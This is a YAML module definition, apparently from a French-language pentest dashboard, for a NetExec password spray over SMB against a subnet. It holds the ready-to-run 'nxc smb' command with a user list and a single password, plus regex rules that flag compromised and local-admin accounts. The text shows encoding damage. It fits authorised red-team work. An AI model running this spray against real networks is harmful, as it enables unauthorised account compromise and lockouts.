id: nxc_password_spray
name: NetExec Password Spray
category: Exploitation
description: "Teste un mot de passe sur une liste d'utilisateurs via SMB."
checklist_keys: ["pass_spray"] 
inputs:
  - name: target
    label: "Cible (IP/CIDR)"
    placeholder: 10.3.10.0/24
    default: 10.3.10.0/24
  - name: user_file
    label: "Fichier Utilisateurs"
    placeholder: /workspace/users.txt
    default: /workspace/users.txt
  - name: password
    label: "Mot de passe Ã  tester"
    placeholder: Winter2025!
# --continue-on-success : Continue mÃªme si un compte est trouvÃ© (pour en trouver d'autres)
command: "nxc smb {{target}} -u {{user_file}} -p '{{password}}' --continue-on-success"

parsing:
  mode: "text"
  
  rules:
    # CORRECTION ICI : (?!.*\(Guest\)) empÃªche de matcher si "(Guest)" est prÃ©sent sur la ligne
    - name: "Compte Compromis"
      regex: "\\[\\+\\](?!.*\\(Guest\\))" 
      badge: "ğŸŸ¢ [PWNED]"

    - name: "Admin Local (Pwn3d!)"
      regex: "\\(Pwn3d!\\)"
      badge: "ğŸ‘‘ [ADMIN]"

    - name: "Doit changer MDP"
      regex: "STATUS_PASSWORD_MUST_CHANGE"
      badge: "âš ï¸ [CHANGE PWD]"
      
    # OPTIONNEL : Si tu veux quand mÃªme voir les Guest mais en INFO (Bleu) et pas en CRITIQUE
    - name: "AccÃ¨s InvitÃ© (Guest)"
      regex: "\\(Guest\\)"
      badge: "ğŸ”µ [INFO]"